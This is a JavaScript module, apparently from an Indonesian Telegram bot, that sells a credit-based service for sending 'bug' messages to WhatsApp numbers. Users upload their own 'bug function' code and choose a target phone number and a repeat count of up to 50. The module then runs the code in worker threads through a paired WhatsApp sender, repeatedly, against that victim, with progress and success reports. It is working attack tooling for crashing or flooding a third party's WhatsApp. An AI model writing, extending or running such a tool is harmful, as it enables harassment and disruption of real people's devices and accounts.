const router = require("./router");
const cfg = require("../config");
const fs = require("fs");
const path = require("path");
const { Worker } = require("worker_threads");
const notify = require("./notify");

const WORKER_PATH = path.join(__dirname, "wa-worker.js");


router.registerCallback("menu_tesfunc", async (bot, q, data, user, ctx) => {
    const senders = ctx.db.read("senders");
    const list = Object.keys(senders);

    if (list.length === 0) {
        return bot.sendMessage(q.message.chat.id,
            `<b>✕ Belum ada sender!</b>\n\nSilakan Add Sender dulu.`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [[
                    ]]
                }
            });
    }

    if (user.credit < 1) {
        return bot.sendMessage(q.message.chat.id,
            `<b>✕ Credit lu habis!</b>\n\nCredit minimal 1 untuk tes function.`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [[
                        { text: "𖡛 Buy Credit", callback_data: "menu_buycredit", style: "primary" }
                    ]]
                }
            });
    }

    const caption =
        `<b>𖡛 TES FUNCTION BUG</b>\n\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `𖡛 <b>Senders tersedia</b>: <code>${list.length}</code>\n` +
        `𖡛 <b>Credit lu</b>: <code>${user.credit}</code>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n\n` +
        `<i>Step 1/3 — Kirim file .txt berisi kode function ATAU ketik langsung function nya di chat.</i>`;

    ctx.setState(user.id, "tesfunc_func", {
        stage: "func",
        funcContent: null,
        target: null,
        count: 0,
    });

    await bot.sendMessage(q.message.chat.id, caption, {
        parse_mode: "HTML",
        reply_markup: {
            inline_keyboard: [[
                { text: "✕ Batal", callback_data: "menu_back", style: "danger" }
            ]]
        }
    });
});


router.registerMessage("tesfunc_func", async (bot, msg, state, ctx) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    let content = "";

    if (msg.document) {
        try {
            const fileLink = await bot.getFileLink(msg.document.file_id);
            const axios = require("axios");
            const res = await axios.get(fileLink, { responseType: "text", timeout: 15000 });
            content = res.data;
        } catch (e) {
            ctx.clearState(userId);
            return bot.sendMessage(chatId,
                `✖️ Gagal baca file: <code>${e.message}</code>`,
                { parse_mode: "HTML" });
        }
    } else if (msg.text && msg.text.toLowerCase() !== "batal") {
        content = msg.text;
    } else {
        return;
    }

    if (!content || content.trim().length < 5) {
        return bot.sendMessage(chatId,
            `<b>✕ Function kosong / terlalu pendek!</b>\n\nKirim ulang function bug nya.`,
            { parse_mode: "HTML" });
    }

    ctx.setState(userId, "tesfunc_target", {
        stage: "target",
        funcContent: content,
        target: null,
        count: 0,
    });

    await bot.sendMessage(chatId,
        `<b>𖡛 STEP 2/3 — NOMOR TARGET</b>\n\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `𖡛 <b>Function diterima</b>: <code>${content.length} chars</code>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n\n` +
        `<i>Kirim nomor target (contoh: 08xxxxxxxxxx / 62xxxxxxxxxx)</i>\n` +
        `<i>Atau ketik <code>batal</code> untuk keluar.</i>`,
        { parse_mode: "HTML" });
});


router.registerMessage("tesfunc_target", async (bot, msg, state, ctx) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = (msg.text || "").trim();

    if (text.toLowerCase() === "batal") {
        ctx.clearState(userId);
        return bot.sendMessage(chatId, `<b>✕ Dibatalkan.</b>`, { parse_mode: "HTML" });
    }

    const digits = text.replace(/[^0-9]/g, "");
    if (digits.length < 9 || digits.length > 15) {
        return bot.sendMessage(chatId,
            `<b>✕ Nomor ga valid!</b>\n\nKirim ulang nomor target (9-15 digit).`,
            { parse_mode: "HTML" });
    }

    let target = digits;
    if (target.startsWith("0")) target = "62" + target.slice(1);
    if (!target.startsWith("62")) target = "62" + target;

    ctx.setState(userId, "tesfunc_count", {
        stage: "count",
        funcContent: state.funcContent,
        target: target,
        count: 0,
    });

    await bot.sendMessage(chatId,
        `<b>𖡛 STEP 3/3 — JUMLAH SEND</b>\n\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `𖡛 <b>Target</b>: <code>+${target}</code>\n` +
        `𖡛 <b>Function</b>: <code>${state.funcContent.length} chars</code>\n` +
        `━━━━━━━━━━━━━━━━━━━━\n\n` +
        `<i>Kirim berapa kali bug mau dikirim (contoh: 1 / 5 / 10)</i>\n` +
        `<i>Max 50x per eksekusi. Ketik <code>batal</code> untuk keluar.</i>`,
        { parse_mode: "HTML" });
});


router.registerMessage("tesfunc_count", async (bot, msg, state, ctx) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = (msg.text || "").trim().toLowerCase();

    if (text === "batal") {
        ctx.clearState(userId);
        return bot.sendMessage(chatId, `<b>✕ Dibatalkan.</b>`, { parse_mode: "HTML" });
    }

    let count = parseInt(text, 10);
    if (isNaN(count) || count < 1) {
        return bot.sendMessage(chatId,
            `<b>✕ Jumlah ga valid!</b>\n\nKirim angka 1-50.`,
            { parse_mode: "HTML" });
    }
    if (count > 50) count = 50;

    const funcContent = state.funcContent;
    const target = state.target;

    const user = ctx.db.getUser(userId);
    if (user.credit < 1) {
        ctx.clearState(userId);
        return bot.sendMessage(chatId, `<b>✕ Credit lu habis!</b>`, { parse_mode: "HTML" });
    }

    ctx.db.saveUser(userId, { credit: user.credit - 1 });
    ctx.clearState(userId);

    const senders = ctx.db.read("senders");
    const senderKey = Object.keys(senders)[0];

    const loading = await bot.sendMessage(chatId,
        `<b>𖡛 Eksekusi 0/${count}</b>\n\n` +
        `𖡛 Target: <code>+${target}</code>\n` +
        `𖡛 Sender: <code>${senderKey}</code>\n` +
        `𖡛 Progress: 0%`,
        { parse_mode: "HTML" });

    let success = 0;
    let failed = 0;
    const errors = [];

    for (let i = 1; i <= count; i++) {
        const result = await new Promise((resolve) => {
            const worker = new Worker(WORKER_PATH, {
                workerData: {
                    senderNumber: senderKey,
                    target,
                    functionCode: funcContent,
                    pairingDir: path.join(__dirname, "..", "pairing")
                }
            });
            const timer = setTimeout(() => {
                try { worker.terminate(); } catch {}
                resolve({ ok: false, error: "timeout 30 detik" });
            }, 30000);
            worker.on("message", (m) => {
                clearTimeout(timer);
                try { worker.terminate(); } catch {}
                resolve(m);
            });
            worker.on("error", (err) => {
                clearTimeout(timer);
                try { worker.terminate(); } catch {}
                resolve({ ok: false, error: err.message });
            });
        });

        if (result.ok) success++;
        else {
            failed++;
            if (result.error && errors.length < 5) errors.push(result.error);
        }

        const pct = Math.floor((i / count) * 100);
        try {
            await bot.editMessageText(
                `<b>𖡛 Eksekusi ${i}/${count}</b>\n\n` +
                `𖡛 Target: <code>+${target}</code>\n` +
                `𖡛 Sender: <code>${senderKey}</code>\n` +
                `𖡛 Progress: ${pct}%\n` +
                `𖡛 Success: <code>${success}</code> | Fail: <code>${failed}</code>`,
                { chat_id: chatId, message_id: loading.message_id, parse_mode: "HTML" });
        } catch {}

        if (i < count) await new Promise(r => setTimeout(r, 800));
    }

    try { await bot.deleteMessage(chatId, loading.message_id); } catch {}

    const userAfter = ctx.db.getUser(userId);
    const waktu = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
    const allOk = failed === 0;

    const reportCaption =
        `<b>${allOk ? "✓ SEND BUG SUCCESS" : "⚠️ SEND BUG PARTIAL"}</b>\n\n` +
        `━━━━━━━━━━━━━━━━━━━━\n` +
        `𖡛 <b>Target</b>: <code>+${target}</code>\n` +
        `𖡛 <b>Sender</b>: <code>${senderKey}</code>\n` +
        `𖡛 <b>Total Request</b>: <code>${count}x</code>\n` +
        `𖡛 <b>Success</b>: <code>${success}</code>\n` +
        `𖡛 <b>Failed</b>: <code>${failed}</code>\n` +
        `𖡛 <b>Sisa Credit</b>: <code>${userAfter.credit}</code>\n` +
        `━━━━━━━━━━━━━━━━━━━━` +
        (errors.length ? `\n\n<i>Error sample:</i>\n<code>${errors.join("\n")}</code>` : "");

    try {
        await bot.sendPhoto(chatId, cfg.FOTO.TESFUNC, {
            caption: reportCaption,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "𖡛 Cek Nomor WhatsApp", url: `https://wa.me/${target}`, style: "primary" }],
                    [{ text: "✕ Kembali", callback_data: "menu_back", style: "danger" }]
                ]
            }
        });
    } catch {
        await bot.sendMessage(chatId, reportCaption, { parse_mode: "HTML" });
    }

    if (allOk) {
        await notify.notifySuccess(bot, "TESFUNC SUCCESS", [
            { label: "𖡛 Target", value: "+" + target },
            { label: "𖡛 Sender", value: senderKey },
            { label: "𖡛 Total", value: `${count}x` },
            { label: "𖡛 Success", value: String(success) },
            { label: "𖡛 User", value: msg.from.first_name || "User" },
            { label: "𖡛 User ID", value: String(userId) },
            { label: "𖡛 Sisa Credit", value: String(userAfter.credit) },
            { label: "𖡛 Waktu", value: waktu }
        ], `<b>✓ TESFUNC SUCCESS</b>\n\nTarget: <code>+${target}</code>\nTotal: <code>${count}x</code>\nUser: ${msg.from.first_name}`);
    } else {
        await notify.notifyFailed(bot, "TESFUNC PARTIAL", [
            { label: "𖡛 Target", value: "+" + target },
            { label: "𖡛 Sender", value: senderKey },
            { label: "𖡛 Total", value: `${count}x` },
            { label: "𖡛 Success", value: String(success) },
            { label: "✕ Failed", value: String(failed) },
            { label: "𖡛 User", value: msg.from.first_name || "User" },
            { label: "𖡛 User ID", value: String(userId) },
            { label: "𖡛 Waktu", value: waktu }
        ], `<b>⚠️ TESFUNC PARTIAL</b>\n\nTarget: <code>+${target}</code>\nSuccess: <code>${success}</code> | Fail: <code>${failed}</code>`);
    }
});